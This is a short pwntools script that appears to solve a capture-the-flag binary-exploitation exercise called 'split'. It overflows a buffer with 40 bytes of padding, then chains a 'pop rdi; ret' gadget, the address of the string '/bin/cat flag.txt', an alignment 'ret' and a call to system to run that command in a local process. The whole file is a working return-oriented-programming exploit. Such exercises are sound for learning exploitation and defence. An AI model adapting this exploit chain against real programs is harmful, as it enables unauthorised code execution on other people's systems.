#!/usr/bin/python3

from pwn import *

elf = ELF("./split")
rop = ROP(elf)

payload = (
    b"A" * 40 +
    p64(rop.find_gadget(["pop rdi", "ret"])[0]) +
    p64(next(elf.search(b"/bin/cat flag.txt"))) +
    p64(rop.find_gadget(["ret"])[0]) +
    p64(elf.symbols["system"])
)

ps = process(elf.path)
ps.sendline(payload)
print(ps.recvall().decode())

